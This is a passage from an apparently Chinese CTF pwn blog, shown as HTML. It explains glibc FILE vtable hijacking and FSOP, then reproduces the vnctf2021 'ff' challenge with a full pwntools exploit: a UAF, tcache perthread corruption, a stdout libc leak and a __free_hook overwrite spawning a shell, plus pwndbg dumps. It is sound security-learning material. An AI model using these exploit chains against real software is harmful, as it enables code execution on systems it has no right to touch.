class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x7f75433786e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span> <span class="comment">// vtable的位置</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x562989a57010</span> ◂— <span class="number">0x0</span> <span class="comment">// 成功修改</span></span><br></pre></td></tr></table></figure>
<p>​        // 本文是基于 libc-2.23 及之前的libc上可实施的，libc-2.24 之后加入了 vtable check 机制，无法再构造vtable</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ），是一种劫持 <code>_IO_list_all</code> 来伪造文件流对象链表的利用技术，常与 house of orange 连用，通过调用 <code>_IO_flush_all_lockp</code> 函数触发</p>
<p>该函数会在下面三种情况下被调用：</p>
<ul>
<li>第一，libc 检测到内存错误从而执行 abort 流程时</li>
<li>第二，执行 exit 函数时</li>
<li>第三，main 函数返回时</li>
</ul>
<p>先分析 <code>_IO_flush_all_lockp</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp ()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	 || (fp-&gt;_vtable_offset == <span class="number">0</span></span><br><span class="line">	     &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				  &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	 )</span><br><span class="line">	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      result = EOF;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行 <code>_IO_OVERFLOW</code> 前有两个检查：（通常是采用这个伪造）</p>
<ul>
<li><code>_mode</code> &gt;= 0  </li>
<li><code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code></li>
</ul>
<p>而对 <code>_IO_OVERFLOW</code> 的调用是 <strong>虚表调用</strong> ，是可以进行劫持的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;, <span class="comment">// target</span></span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">    ................</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>
<p>可见第4片区域就是 <code>__overflow</code> 的虚表，我们可以劫持该虚表为“one_gadget”或者其他需要的函数</p>
<p><strong>利用姿势</strong></p>
<p>一般在pwn题中，我们都是构造内存错误，此时会产生一系列的函数调用路径，最终的调用为：<code>_IO_flush_all_lockp</code> —&gt; <code>_IO_OVERFLOW</code>，而这里的 <code>_IO_OVERFLOW</code> 就是文件流对象虚表的第四项指向的内容 <code>_IO_new_file_overflow</code> </p>
<p>因此我们的利用思路一般是：</p>
<ul>
<li>要么直接修改文件流对象</li>
<li>要么伪造一个_IO_FILE结构体</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.24：多了 vtable check，这就意味着我们不能利用任意地址来充当<code>vtable</code> </p>
<p>libc-2.27：完全失效</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/" class="post-title-link" itemprop="url">IO_2_1_stdout leak+Tcache attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-15 23:36:21" itemprop="dateCreated datePublished" datetime="2022-03-15T23:36:21+08:00">2022-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-17 13:56:52" itemprop="dateModified" datetime="2022-03-17T13:56:52+08:00">2022-03-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>vnctf2021 ff 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./pwn </span><br><span class="line"><span class="number">1.</span>add</span><br><span class="line"><span class="number">2.</span>del</span><br><span class="line"><span class="number">3.</span><span class="built_in">exit</span></span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1f</span>d4ed1f1e5db9e2f81e26150d0a5b6db56d2261, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>程序给了 libc 版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.32</span><span class="number">-0u</span>buntu3)</span> release release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[idx]);                <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经典 UAF </p>
<p><strong>入侵思路</strong></p>
<p>程序可以控制的部分太少了，连 free 的参数都不能控制，另外程序是有“打印模块”和“修改模块”的，但是“修改模块”只能使用两次，每次只能改16字节，还没法控制参数，“打印模块”也被法控制，并且只能打印一次</p>
<p>因为只能打印一次，“libc_base”，“chunk_list_addr”，“heap_addr”这些我们想要的数据就只能 leak 一个，我当然是想要 “libc_base” ，但是程序又有限制</p>
<p>因为程序限制 malloc size 的大小，所以 unsortedbin leak 挂了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = myRead();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x7E</span> )</span><br><span class="line">  size = <span class="number">127</span>;                                 <span class="comment">// 大小限制</span></span><br></pre></td></tr></table></figure>
<p>只能泄露“heap_addr”了，在加上“打印模块”的长度不够，所以还需要一些操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;1&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr=eval(hex(leak_addr)+<span class="string">&#x27;0&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+hex(heap_addr))</span><br></pre></td></tr></table></figure>
<p>只知道“heap_addr”，我的第一反应是打 unlink，但是没有 off-by-one 也打不了，我觉得我止步于此了，但我还是想谈一谈我的想法：</p>
<p>这题没有泄露“libc_base”，大概率是要打 house of roman 爆破libc库函数的，关键就在于这个 size 检查把 unsortedbin 限制了，导致 main_arene 写不进来，当然 house of roman 也没毛用了</p>
<p>没有“libc_base”还有一个解决方式，IO_2_1_stdout leak，这种攻击可以和 house of roman 结合（比如我刚刚复现过的 nepctf2021 sooooeasy），但缺少 main_arene 的核心问题还是没有解决</p>
<p>先挂上大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process([file_path])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line">elf=ELF(file_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content=<span class="string">b&quot;1\n&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0xa6c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        delete()</span><br><span class="line">        show()</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">        log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">        edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">        enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">        edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x38</span>, p16(stdout))</span><br><span class="line">        add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">        log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">        <span class="keyword">if</span>(libc.address&gt;<span class="number">0x5000000000000</span> <span class="keyword">or</span> libc.address &lt; <span class="number">0x5000</span>):</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;wrong and continue\n&quot;</span>)</span><br><span class="line">        	<span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = process([file_path])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>经过测试，大佬的 exp 也不是百分之百可以打通的，因为有时候会 leak 异常的 libc_base，所以我修改了一下 exp ，使其可以舍弃掉一些异常的 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span> <span class="comment"># 16进制下填3个0，2进制下填3*4个0</span></span><br><span class="line">log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure>
<p>大佬的 heap_addr 泄露和我的思路一样，但是比我的简洁多了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete() <span class="comment"># 释放&gt;&gt;修改FD&gt;&gt;释放(tcache dup，类似于Double free)</span></span><br><span class="line">enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line"><span class="comment"># 利用tcache dup申请tcache_perthread_struct </span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0007000000000000</span> <span class="comment">// 修改count为&#x27;7&#x27;</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>delete() 执行之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd000</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd000</span></span><br></pre></td></tr></table></figure>
<p>大佬果然有办法搞到“main_arena”，这里其实是利用了 tcache 的机制：</p>
<ul>
<li>当某一个tcache链表满了7个，再有对应的chunk（不属于fastbin的）被free，就直接进入了unsortedbin中</li>
<li>tcache_perthread_struct 结构一般在 heapbase+0x10（0x8）的位置，对应tcache的数目是char类型</li>
</ul>
<p>因为程序没法控制“释放模块”的参数，所以想通过正常手段填满 tache 显然不可能了，但是我们已知 heapbase 的地址，可以通过 tcache dup 来劫持 tcache_perthread_struct，将<code>0x290</code>大小堆块对应的<code>count</code>设置为<code>7</code>，释放后就会把整个 tcache_perthread_struct 放入 unsortedbin（这种攻击模式被称为 tcache perthread corruption）</p>
<p>注意：因为 libc-2.32 新增加的特性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
<p>程序会对 <code>tcache-&gt;fd</code> 指针的加密（还有这种操作？），所以我们在伪造 FD 的时候也要进行一次相同的加密</p>
<p>接下来申请了两个 chunk 把“heap_base + 0xb0”连接入“tcachebin”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>)) <span class="comment"># heap_base+0xb0 to tache</span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<p>释放后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br><span class="line"><span class="number">0x558b1cfcd0c0</span>:	<span class="number">0x0000000558b1cfcd</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0d0</span>:	<span class="number">0x0000000000000000</span>	